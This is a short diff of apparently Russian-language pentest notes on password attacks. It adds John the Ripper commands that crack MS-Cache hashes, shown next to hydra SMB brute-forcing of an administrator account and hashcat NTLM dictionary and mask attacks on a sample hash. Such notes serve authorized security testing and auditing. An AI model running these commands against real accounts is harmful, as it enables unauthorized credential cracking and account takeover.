@@ -22,13 +22,15 @@ hydra -x 7:8:1 -l administrator smb://192.168.50.200 -m "ROOT.DC" -V
 
 Перебор хешей по словарю
 
+john --format=mscash2 --wordlist=/usr/share/wordlists/rockyou.txt filehash
+
+john --format=mscash --mask='?a' --min-length=7 --max-length=10 filehash
+
 hashcat -m 1000 hash.txt dict.txt
+
 hashcat ujas.txt rockyou.txt - автодетектинг хеша (файл может быть с хламом)
 
-
-
 Загляним в справку Hashcat, чтобы узнать номер режима хеша NTLM: 1000 | NTLM  
-
 
 Брут хешей
 hashcat --force --hwmon-temp-abort=100 -m 1000 -D 1,2 -a 3 -i --increment-min 5 --increment-max 12 -1 ?l?u?d FB6CEDE76A37702EAD2615DC27B626EF ?1?1?1?1?1?1?1?1?1?1?1?1?1
